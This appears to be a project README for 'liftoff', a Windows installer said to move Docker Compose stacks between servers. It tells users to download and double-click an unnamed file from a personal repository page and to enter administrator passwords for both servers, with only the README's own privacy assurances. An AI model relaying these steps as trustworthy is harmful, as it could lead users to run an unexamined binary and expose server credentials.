# 🚀 liftoff - Move Docker stacks between servers easily

[![](https://img.shields.io/badge/Download_Liftoff_Latest-blue)](https://github.com/Tushar69kk/liftoff)

## 📦 What is this tool

Liftoff helps you move your existing website or application setups from one server to another. If you run services using Docker Compose, this tool handles the heavy lifting. It works best when you need to change hosting providers or upgrade your current server.

The software automates the boring parts of moving your data. It manages your databases, files, and settings so your services experience little to no downtime. You do not need to be a system administrator to use it. The program includes a simple screen that guides you through every step.

## 📋 Features

*   **Guided Setup:** An interactive menu walks you through the migration process.
*   **Live Dashboard:** View the progress of your file transfers in real time.
*   **Automatic Data Sync:** The tool detects your volumes and moves them safely to the new machine.
*   **Database Support:** Handles popular databases like MongoDB, MySQL, PostgreSQL, and Redis.
*   **Consistency:** Works with your existing Docker Compose files without requiring changes to your project.

## 🖥️ System Requirements

Before you start, make sure your computer meets these needs:

*   **Operating System:** Windows 10 or Windows 11.
*   **Memory:** At least 4GB of RAM.
*   **Storage:** 200MB of free disk space for the tool itself.
*   **Network:** An active internet connection on both the source and destination servers.
*   **Docker:** Docker Desktop must be installed and running on your Windows machine.

## 📥 Installing Liftoff

You need to download the installer to begin. Follow these instructions:

1.  Visit [this page](https://github.com/Tushar69kk/liftoff) to download the latest version of the software.
2.  Locate the file you downloaded in your Downloads folder.
3.  Double-click the file to start the installer.
4.  Follow the prompts on your screen.
5.  Click Finish to complete the process.

## 🛠️ How to use the software

Once the installer finishes, you can launch the application from your Start menu. The tool uses a simple interface to help you migrate your data.

### Step 1: Connect to your servers
The application will ask for the connection details for your old server and your new server. You will need your server IP address and your administrator password. The tool saves your credentials locally and does not send them to a third party.

### Step 2: Select your project
After the tool connects to your primary server, it will scan for Docker Compose files. Choose the project you want to move from the list. The tool displays your active containers and the databases they use.

### Step 3: Run the migration
Click the Start Migration button. The dashboard will now appear. You will see bars showing the progress of your database transfers and file syncs. Do not close the window while the migration runs. 

### Step 4: Verify the move
Once the tool finishes, it will prompt you to test your site. Visit the URL of your new server to check if everything works as expected. If everything looks good, you can safely turn off the services on your old server.

## ⚙️ Handling common issues

Most users find the migration process smooth. However, issues can happen.

**The connection fails:**
Check that your firewall allows traffic on the port used by Docker SSH. Make sure you can log in to your server using a standard terminal to verify your credentials.

**The migration stops mid-way:**
Poor internet connections sometimes cause interruptions. If this happens, restart the application and select your project again. The tool detects existing files and will resume from where it stopped.

**Database errors:**
Ensure your database containers are running on your old server during the transfer. The tool needs the database to be active to copy the information correctly.

## 🛡️ Data privacy

Your server details remain on your local machine. Liftoff does not host your data or keep copies of your files. All transfers occur directly between your old server and your new server. You maintain full control over your information at all times.

## 📌 Technical notes

Liftoff performs these actions to ensure a successful move:
*   Pauses your containers to prevent data changes during the copy.
*   Creates a snapshot of your volume data.
*   Copies and restores database dumps.
*   Transfers the Docker Compose configuration file to the new location.
*   Starts your containers on the new server.

This ensures that your environment matches your original setup exactly. You do not need to reconfigure your settings or update your source files manually.